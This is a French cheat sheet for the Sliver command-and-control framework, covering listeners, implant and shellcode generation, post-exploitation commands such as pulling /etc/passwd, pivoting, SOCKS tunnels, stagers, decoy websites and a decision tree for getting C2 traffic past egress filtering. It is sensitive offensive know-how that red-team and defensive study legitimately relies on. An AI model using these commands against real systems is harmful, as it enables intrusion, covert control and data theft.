# Aide-mémoire Sliver

## Console et objets

| Commande | Effet |
|---|---|
| `jobs` | liste les listeners |
| `sessions` / `beacons` | liste les implants connectés |
| `use <id\|préfixe>` | sélectionne une session/beacon (sans argument : menu) |
| `use -` | revient à la session précédente |
| `background` | quitte la session sans la fermer |
| `close` | ferme une session interactive (le beacon survit) |
| `implants` | implants générés, `regenerate` pour re-télécharger |
| `info` | détails de l'implant courant |
| `tasks` / `tasks fetch` | historique et sorties des tâches (beacon) |
| `settings` | préférences de la console |
| `help` / `<cmd> --help` | aide, auto-complétion par Tab |

## Listener

| Commande | Défaut | Notes |
|---|---|---|
| `mtls --lport 8888` | TCP/8888 | recommandé |
| `wg --lport 51820` | UDP/53 | changer si DNS utilisé |
| `http --lport 80 --domain X --website Y` | TCP/80 | répond à tout Host sans `--domain` |
| `https --lport 443 --domain X` | TCP/443 | auto-signé, `--lets-encrypt` possible |
| `dns --domains 1.lab.test. --lport 53` | UDP/53 | FQDN avec point final |

## Génération

```text
generate --mtls 10.0.0.5 --os linux --arch amd64 --save /shared -N web01
generate beacon --http 10.0.0.5 --seconds 60 --jitter 30 --save /shared
generate --wg 10.0.0.5 --os windows --format shellcode
generate --dns 1.lab.test. --canary 1.lab.test.
generate --tcp-pivot 10.0.0.6:9898
```

| Flag | Usage |
|---|---|
| `--os`, `--arch` | cible Go (`linux`, `windows`, `darwin` ; `amd64`, `arm64`, `386`) |
| `--format` | `exe`, `shared`, `shellcode`, `service` |
| `--save` | répertoire de sortie |
| `-N/--name` | nom de l'implant |
| `--strategy s\|r` | séquentiel (défaut) ou aléatoire entre endpoints |
| `--reconnect`, `--max-errors` | reprise / abandon |
| `--debug` | logs verbeux côté implant |
| `--skip-symbols` | désactive l'obfuscation des symboles (build plus rapide) |
| `--canary` | domaine piège |
| `--spoof-metadata` | métadonnées d'un PE donneur |

## Post-exploitation (session)

```text
pwd, ls, cd, cat, head, tail, grep, mkdir, cp, mv, rm
download <remote> [local]        upload <local> <remote>
execute -o /bin/ls -la           shell
whoami, getuid, getgid, getpid, env, info, ping
screenshot                       (Windows/Linux)
portfwd add --remote 10.0.0.7:3389 [--bind 0.0.0.0:9000]
rportfwd add --remote 127.0.0.1:8080 --bind 0.0.0.0:9000
socks5 start [--port 1080]
pivots tcp [--bind 0.0.0.0:9898]
pivots named-pipe --bind agent01     (Windows)
loot remote /etc/passwd
```

## Beacon

```text
reconfig -i 30s -j 10s
interactive            # ouvre une session sur le canal courant
tasks
tasks fetch
beacons watch
```

## Réseau / tunnels

```text
# Pivot (session) : écoute dans le réseau de la cible
pivots tcp
generate --tcp-pivot 172.29.0.21:9898 --os linux --save /shared

# Port forwarding in-band
portfwd add --remote 172.29.0.22:8080 --bind 0.0.0.0:9000

# SOCKS5 (session uniquement)
socks5 start --port 1080
curl --socks5-hostname 127.0.0.1:1080 http://172.29.0.22:8080/debug

# WireGuard (si C2 WG)
wg-config --save /shared/wg0.conf
wg-portfwd add --remote 10.0.0.7:3389
wg-socks start
```

## Stager / profil / leurre

```text
profiles new --http 172.28.0.10 --format shellcode --os linux --arch amd64 linux-sc
stage-listener --url http://172.28.0.10:8081 --profile linux-sc
websites --website fake --web-path / --content ./index.html add
http --lport 80 --website fake
c2profiles                     # lister
c2profiles export default /tmp/http-c2.json
c2profiles import /tmp/http-c2.json
```

## Multiplayer / serveur

```text
multiplayer [--lport 31337]
new-operator --name alice --lhost 1.2.3.4 --permissions all
sliver-client import alice.cfg
sliver-server daemon
sliver-server operator --name bob --lhost 1.2.3.4 --permissions all --save bob.cfg
```

## Arbre de décision

```
Besoin d'un shell interactif maintenant ?
├─ oui → session (mTLS en priorité)
└─ non → beacon (intervalle long + jitter)

Seule la 80/443 sort ?
└─ HTTP(S) + profil crédible (+ website leurre)

Seul le DNS sort ?
└─ DNS C2 (lent, bruyant, mais passe)

Besoin d'atteindre un autre subnet ?
├─ y déployer un implant → pivot tcp/named-pipe
├─ utiliser un outil sur un port → portfwd
└─ utiliser plusieurs ports/outils → socks5 (ou wg-socks)

Besoin d'un petit chargeur ?
└─ profil shellcode + stage-listener (+ msfvenom côté Windows)
```

## Pièges fréquents

- `--save` attend un **répertoire** ; le nom de fichier est le nom de code.
- Un implant ne peut ouvrir une session que sur un protocole **compilé dedans**.
- `socks5`, `portfwd`, `pivots` : **session uniquement**.
- Beacon : les résultats attendent la tâche la plus longue du lot.
- DNS : FQDN avec **point final**, TTL court, `systemd-resolved` désactivé sur
  le serveur si nécessaire.
- Alias : `--` avant les flags destinés à l'outil (`seatbelt -- -group=system`).
- `armory` installe côté client, pas côté serveur.
